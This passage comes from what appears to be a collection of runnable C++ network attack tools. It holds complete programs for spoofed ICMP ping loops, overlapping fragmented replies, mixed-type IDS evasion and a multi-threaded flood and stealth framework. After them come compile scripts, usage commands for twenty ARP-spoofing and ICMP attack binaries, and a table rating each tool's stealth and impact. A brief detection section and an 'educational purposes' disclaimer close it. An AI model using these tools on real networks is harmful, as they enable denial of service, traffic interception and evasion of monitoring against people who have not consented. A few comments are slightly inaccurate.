               (struct sockaddr*)&dest, sizeof(dest));
    }
    
    // Combined: send request to A with spoofed source B, and vice versa
    void run(const std::string& victimA, const std::string& victimB) {
        std::cout << "[*] Fake ICMP ping loop attack\n";
        std::cout << "[*] Victim A: " << victimA << "\n";
        std::cout << "[*] Victim B: " << victimB << "\n";
        std::cout << "[*] Both think the other is pinging them\n";
        
        uint16_t seq = 0;
        while (true) {
            // A thinks B is pinging it
            sendSpoofedRequest(victimA, victimB, 1234, seq);
            
            // B thinks A is pinging it
            sendSpoofedRequest(victimB, victimA, 1234, seq);
            
            seq++;
            usleep(100000);  // 100ms
        }
    }
    
    ~FakePingLoop() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] 
                  << " <victim_a_ip> <victim_b_ip>\n";
        return 1;
    }
    FakePingLoop loop;
    loop.run(argv[1], argv[2]);
    return 0;
}
```

**Technique:** Creates a ping loop between two victims by spoofing ICMP echo requests. Both victims respond to each other endlessly — DoS from mutual traffic, log flooding, and evasion from real attacker.

---

### 18. ICMP Reply with Fragment Overlap
```cpp
// Compile: g++ -o fake_ping_frag fake_ping_frag.cpp
// Run: sudo ./fake_ping_frag <target_ip> <spoofed_src_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakePingFragment {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakePingFragment() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    // Send fragmented fake ping reply that reassembles into different packet
    void sendFragmented(const std::string& targetIP, 
                        const std::string& spoofedSrcIP,
                        uint16_t id, uint16_t seq) {
        // Total ICMP payload
        uint8_t fullPayload[200];
        memset(fullPayload, 0, sizeof(fullPayload));
        
        struct icmphdr* icmp = (struct icmphdr*)fullPayload;
        icmp->type = ICMP_ECHOREPLY;
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        // Fill payload
        for (int i = 0; i < 192; i++) {
            fullPayload[8 + i] = rand() & 0xFF;
        }
        
        icmp->checksum = checksum(fullPayload, 200);
        
        // Fragment ID
        uint16_t fragId = rand() & 0xFFFF;
        struct in_addr src;
        inet_pton(AF_INET, spoofedSrcIP.c_str(), &src);
        struct in_addr dst;
        inet_pton(AF_INET, targetIP.c_str(), &dst);
        
        // First fragment (offset 0, MF=1)
        uint8_t frag1[1500];
        memset(frag1, 0, sizeof(frag1));
        
        struct iphdr* ip1 = (struct iphdr*)frag1;
        ip1->ihl = 5;
        ip1->version = 4;
        ip1->tot_len = htons(20 + 100);  // 20 IP + 100 data
        ip1->id = htons(fragId);
        ip1->frag_off = htons(0x2000);  // MF flag
        ip1->ttl = 64;
        ip1->protocol = IPPROTO_ICMP;
        ip1->saddr = src.s_addr;
        ip1->daddr = dst.s_addr;
        ip1->check = checksum(ip1, 20);
        
        memcpy(frag1 + 20, fullPayload, 100);
        
        sendto(sock, frag1, 20 + 100, 0,
               (struct sockaddr*)&dst, sizeof(dst));
        
        usleep(50000);  // Small delay
        
        // Second fragment (offset 100, MF=0)
        uint8_t frag2[1500];
        memset(frag2, 0, sizeof(frag2));
        
        struct iphdr* ip2 = (struct iphdr*)frag2;
        ip2->ihl = 5;
        ip2->version = 4;
        ip2->tot_len = htons(20 + 100);
        ip2->id = htons(fragId);
        ip2->frag_off = htons(100 / 8);  // Offset 100 bytes = 12.5 units; use 12
        ip2->ttl = 64;
        ip2->protocol = IPPROTO_ICMP;
        ip2->saddr = src.s_addr;
        ip2->daddr = dst.s_addr;
        ip2->check = checksum(ip2, 20);
        
        memcpy(frag2 + 20, fullPayload + 100, 100);
        
        sendto(sock, frag2, 20 + 100, 0,
               (struct sockaddr*)&dst, sizeof(dst));
    }
    
    void run(const std::string& targetIP, const std::string& spoofedSrcIP) {
        std::cout << "[*] Fragmented fake ping reply\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Sending fragmented ICMP replies\n";
        
        while (true) {
            sendFragmented(targetIP, spoofedSrcIP, 1234, rand() & 0xFFFF);
            usleep(1000000);
        }
    }
    
    ~FakePingFragment() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <spoofed_src_ip>\n";
        return 1;
    }
    srand(time(NULL));
    FakePingFragment frag;
    frag.run(argv[1], argv[2]);
    return 0;
}
```

**Technique:** Fragmented fake ping replies. Overlapping fragments can confuse OS reassembly, bypass some firewalls, or evade IDS signature matching on whole packets.

---

### 19. ICMP Reply with Type Confusion (Mixed Types)
```cpp
// Compile: g++ -o fake_ping_mixed fake_ping_mixed.cpp
// Run: sudo ./fake_ping_mixed <target_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakePingMixed {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakePingMixed() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void sendICMP(const std::string& targetIP, uint8_t type, uint8_t code,
                  uint16_t id, uint16_t seq) {
        uint8_t packet[64];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = type;
        icmp->code = code;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        memcpy(packet + sizeof(struct icmphdr), "MixedTypeData", 13);
        int packetLen = sizeof(struct icmphdr) + 13;
        
        icmp->checksum = checksum(packet, packetLen);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
    }
    
    // Rotate through ICMP types to confuse IDS/monitoring
    void run(const std::string& targetIP) {
        std::cout << "[*] Fake ICMP mixed-type attack\n";
        std::cout << "[*] Rotating through ICMP types 0, 3, 5, 8, 11, 12, 13, 17\n";
        
        uint8_t types[] = {0, 3, 5, 8, 11, 12, 13, 17};
        int numTypes = sizeof(types) / sizeof(types[0]);
        int i = 0;
        
        while (true) {
            uint8_t type = types[i % numTypes];
            i++;
            
            sendICMP(targetIP, type, 0, 1234, rand() & 0xFFFF);
            std::cout << "[*] Sent type " << (int)type << "\n";
            
            usleep(300000);
        }
    }
    
    ~FakePingMixed() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <target_ip>\n";
        return 1;
    }
    srand(time(NULL));
    FakePingMixed mixed;
    mixed.run(argv[1]);
    return 0;
}
```

**Technique:** Rotates through multiple ICMP types to confuse IDS/monitoring. Each type triggers different protocol handlers. Can identify which ICMP types reach the target.

---

### 20. ICMP Reply Framework with Stealth + Verification
```cpp
// Compile: g++ -o fake_ping_framework fake_ping_framework.cpp -lpthread
// Run: sudo ./fake_ping_framework <target_ip> <spoofed_src_ip> <mode>
// Modes: basic, flood, stealth, mixed
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <random>
#include <thread>
#include <atomic>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <poll.h>

class FakePingFramework {
private:
    std::atomic<int> sentCount{0};
    std::atomic<bool> running{true};
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    void sendFakeReply(const std::string& targetIP, 
                       const std::string& spoofedSrcIP,
                       uint16_t id, uint16_t seq, int payloadLen) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) return;
        
        uint8_t packet[1500];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = ICMP_ECHOREPLY;
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        // Random payload
        for (int i = 0; i < payloadLen && i < 1400; i++) {
            packet[sizeof(struct icmphdr) + i] = rand() & 0xFF;
        }
        
        int packetLen = sizeof(struct icmphdr) + payloadLen;
        icmp->checksum = checksum(packet, packetLen);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        sentCount++;
    }
    
    void basicMode(const std::string& targetIP, const std::string& spoofedSrcIP) {
        std::cout << "[*] Basic mode: 1 reply per second\n";
        uint16_t seq = 0;
        while (running.load()) {
            sendFakeReply(targetIP, spoofedSrcIP, 1234, seq++, 15);
            usleep(1000000);
        }
    }
    
    void floodMode(const std::string& targetIP, const std::string& spoofedSrcIP,
                   int numThreads) {
        std::cout << "[*] Flood mode: " << numThreads << " threads\n";
        
        std::vector<std::thread> threads;
        for (int i = 0; i < numThreads; i++) {
            threads.emplace_back([&, i]() {
                uint16_t seq = 0;
                while (running.load()) {
                    sendFakeReply(targetIP, spoofedSrcIP, 
                                  1000 + i, seq++, 
                                  8 + (rand() % 56));
                }
            });
        }
        
        for (auto& t : threads) t.join();
    }
    
    void stealthMode(const std::string& targetIP, const std::string& spoofedSrcIP) {
        std::cout << "[*] Stealth mode: random intervals\n";
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delayDis(500, 5000);
        std::uniform_int_distribution<> sizeDis(8, 1000);
        
        uint16_t seq = 0;
        while (running.load()) {
            sendFakeReply(targetIP, spoofedSrcIP, 1234, seq++, sizeDis(gen));
            int delayMs = delayDis(gen);
            usleep(delayMs * 1000);
        }
    }
    
    void mixedMode(const std::string& targetIP, const std::string& spoofedSrcIP) {
        std::cout << "[*] Mixed mode: alternating ICMP types\n";
        
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) return;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        uint8_t types[] = {0, 3, 5, 11, 12, 13, 17};
        int i = 0;
        
        while (running.load()) {
            uint8_t packet[64];
            memset(packet, 0, sizeof(packet));
            
            struct icmphdr* icmp = (struct icmphdr*)packet;
            icmp->type = types[i % 7];
            icmp->code = 0;
            icmp->un.echo.id = htons(1234);
            icmp->un.echo.sequence = htons(i & 0xFFFF);
            icmp->checksum = 0;
            
            memcpy(packet + sizeof(struct icmphdr), "MixedFramework", 14);
            icmp->checksum = checksum(packet, sizeof(struct icmphdr) + 14);
            
            sendto(sock, packet, sizeof(struct icmphdr) + 14, 0,
                   (struct sockaddr*)&dest, sizeof(dest));
            
            sentCount++;
            i++;
            usleep(500000);
        }
        
        close(sock);
    }
    
    void statsLoop() {
        while (running.load()) {
            sleep(5);
            std::cout << "[*] Sent: " << sentCount.load() << " fake replies\n";
        }
    }
    
public:
    void run(const std::string& targetIP, const std::string& spoofedSrcIP,
             const std::string& mode) {
        std::cout << "========================================\n";
        std::cout << " Fake ICMP Reply Framework\n";
        std::cout << "========================================\n";
        std::cout << " Target: " << targetIP << "\n";
        std::cout << " Spoofed source: " << spoofedSrcIP << "\n";
        std::cout << " Mode: " << mode << "\n";
        std::cout << "========================================\n\n";
        
        std::thread stats(&FakePingFramework::statsLoop, this);
        stats.detach();
        
        if (mode == "basic") {
            basicMode(targetIP, spoofedSrcIP);
        } else if (mode == "flood") {
            floodMode(targetIP, spoofedSrcIP, 10);
        } else if (mode == "stealth") {
            stealthMode(targetIP, spoofedSrcIP);
        } else if (mode == "mixed") {
            mixedMode(targetIP, spoofedSrcIP);
        } else {
            std::cerr << "[!] Unknown mode: " << mode << "\n";
            std::cerr << "    Modes: basic, flood, stealth, mixed\n";
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <spoofed_src_ip> <mode>\n";
        std::cerr << "Modes: basic, flood, stealth, mixed\n";
        return 1;
    }
    srand(time(NULL));
    FakePingFramework framework;
    framework.run(argv[1], argv[2], argv[3]);
    return 0;
}
```

**Technique:** Complete fake ICMP reply framework with 4 modes (basic/flood/stealth/mixed). Auto stats, thread management, and flexible attack profiles for different scenarios.

---

## Compilation Guide

### Prerequisites
```bash
sudo apt-get install -y build-essential g++
```

### Bulk Compile
```bash
#!/bin/bash
for file in arp_reply_*.cpp fake_ping_*.cpp; do
    [ -f "$file" ] || continue
    name="${file%.cpp}"
    echo "Compiling $name..."
    g++ -O2 -pthread -o "$name" "$file"
done
```

### Usage Examples

```bash
# ARP Reply Attacks
sudo ./arp_reply_basic eth0 192.168.1.1 00:11:22:33:44:55
sudo ./arp_reply_unicast eth0 192.168.1.100 aa:bb:cc:dd:ee:ff 192.168.1.1 00:11:22:33:44:55
sudo ./arp_reply_decoy eth0 192.168.1.100 aa:bb:cc:dd:ee:ff 192.168.1.1 00:00:00:00:00:99
sudo ./arp_reply_combo eth0 192.168.1.100 aa:bb:cc:dd:ee:ff 192.168.1.1 00:11:22:33:44:55
sudo ./arp_reply_stealth eth0 192.168.1.100 aa:bb:cc:dd:ee:ff 192.168.1.1 00:11:22:33:44:55
sudo ./arp_reply_auto eth0 192.168.1.1 00:11:22:33:44:55
sudo ./arp_reply_multi eth0 00:11:22:33:44:55
sudo ./arp_reply_subnet eth0 00:11:22:33:44:55 192.168.1
sudo ./arp_reply_vendor eth0 192.168.1.100 aa:bb:cc:dd:ee:ff 192.168.1.1 cisco
sudo ./arp_reply_framework eth0 192.168.1.100 aa:bb:cc:dd:ee:ff 192.168.1.1 00:11:22:33:44:55 de:ad:be:ef:00:01

# Fake Ping Reply Attacks
sudo ./fake_ping_basic 192.168.1.100 1.2.3.4
sudo ./fake_ping_flood 192.168.1.100 1.2.3.4 10000 10
sudo ./fake_ping_payload 192.168.1.100 1.2.3.4 "Injected data here"
sudo ./fake_ping_timestamp 192.168.1.100
sudo ./fake_ping_squench 192.168.1.100 1.2.3.4
sudo ./fake_ping_redirect 192.168.1.100 192.168.1.1 192.168.1.254
sudo ./fake_ping_loop 192.168.1.100 192.168.1.101
sudo ./fake_ping_frag 192.168.1.100 1.2.3.4
sudo ./fake_ping_mixed 192.168.1.100
sudo ./fake_ping_framework 192.168.1.100 1.2.3.4 stealth
```

## Technique Comparison

| # | Technique | Stealth | Impact | Root | Notes |
|---|-----------|---------|--------|------|-------|
| 1 | ARP Broadcast | Low | LAN-wide | Yes | Noisy |
| 2 | ARP Unicast | High | Single host | Yes | Quiet |
| 3 | ARP Decoy MAC | High | Track evasion | Yes | Needs promisc |
| 4 | ARP Combo | Medium | Both | Yes | Redundant |
| 5 | ARP Stealth | Very High | Single host | Yes | Random timing |
| 6 | ARP Auto-Discover | High | Discovered hosts | Yes | Zero config |
| 7 | ARP Multi-IP | Low | Multi-gateway | Yes | Broad |
| 8 | ARP Subnet | Very Low | Whole /24 | Yes | Devastating |
| 9 | ARP Vendor MAC | High | Track evasion | Yes | Fake OUI |
| 10 | ARP Framework | Medium | Full MITM | Yes | Production |
| 11 | Ping Basic | Low | Log spam | Yes | Simple |
| 12 | Ping Flood | Very Low | DoS | Yes | Multi-threaded |
| 13 | Ping Payload | Medium | Data injection | Yes | Covert |
| 14 | Ping Timestamp | High | Time attack | Yes | Legacy |
| 15 | Ping Source Quench | Medium | TCP slowdown | Yes | Legacy |
| 16 | Ping Redirect | High | Route override | Yes | Dangerous |
| 17 | Ping Loop | Very High | Dual victim | Yes | Elegant |
| 18 | Ping Fragment | High | IDS bypass | Yes | Overlap |
| 19 | Ping Mixed | High | Type confusion | Yes | Rotates |
| 20 | Ping Framework | Very High | 4 modes | Yes | Complete |

## Detection & Defense

**ARP Detection:**
- ARPWatch / arpwatch-ng
- Static ARP for critical hosts
- DHCP snooping + DAI (Dynamic ARP Inspection)
- 802.1X port security
- MAC-to-port binding
- Detect duplicate IPs with different MACs

**ICMP Detection:**
- IDS signatures for unsolicited ICMP replies
- Monitor for ICMP reply without preceding request
- Rate limiting on ICMP traffic
- Only allow ICMP from known management networks
- Disable ICMP redirects on hosts

### Sysctl Hardening
```bash
# Disable ICMP redirects
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects

# Ignore ICMP echo broadcasts
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

# Rate-limit ICMP
echo 100 > /proc/sys/net/ipv4/icmp_ratelimit
echo 1000 > /proc/sys/net/ipv4/icmp_ratemask

# Disable source quench
echo 0 > /proc/sys/net/ipv4/conf/all/accept_source_route
```

## Legal Notice

**ALL SCRIPTS ARE FOR EDUCATIONAL PURPOSES ONLY**

These C++ implementations demonstrate network attack techniques for:
- Authorized penetration testing
- Security research and education
- Understanding defensive countermeasures
- Lab environments with explicit permission

**UNAUTHORIZED USE IS ILLEGAL** under:
- Computer Fraud and Abuse Act (CFAA) — US
- Computer Misuse Act — UK
- Network and Information Systems Directive — EU
- Local telecommunications laws

**PENALTIES INCLUDE**:
- Federal criminal charges
- Civil liability and damages
- Imprisonment up to 20+ years
- Permanent criminal record

**RESPONSIBLE USE**:
- Obtain explicit written authorization
- Use only on your own networks/devices
- Never use for billing evasion or unauthorized access
- Report vulnerabilities responsibly
- Follow ethical disclosure practices

---

*This completes 10 ARP reply attacks + 10 fake ping reply attacks in C++, derived from concepts in "TCP/IP Illustrated, Volume 3" by W. Richard Stevens.*
